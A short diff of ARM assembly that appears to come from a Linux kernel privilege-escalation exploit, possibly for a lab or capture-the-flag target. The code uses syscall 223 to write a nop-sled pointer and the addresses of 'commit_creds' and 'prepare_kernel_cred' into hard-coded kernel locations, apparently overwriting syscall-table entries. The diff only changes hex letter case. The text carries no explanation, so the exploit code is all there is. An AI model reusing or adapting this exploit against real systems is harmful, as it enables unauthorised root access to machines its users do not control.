@@ -6,17 +6,17 @@ _start:
 
 mov r7, #223
 ldr r0, =nopsled
-ldr r1, =(0x8003f56c - 0xc)
+ldr r1, =(0x8003F56C - 0xC)
 svc #0
 
 mov r7, #223
 ldr r0, =commit_creds_updated_addr
-ldr r1, =(0x8000e348 + 0x4*44)
+ldr r1, =(0x8000E348 + 0x4*44)
 svc #0
 
 mov r7, #223
 ldr r0, =prepare_kernel_cred_addr
-ldr r1, =(0x8000e348 + 0x4*53)
+ldr r1, =(0x8000E348 + 0x4*53)
 svc #0
 
 mov r7, #53
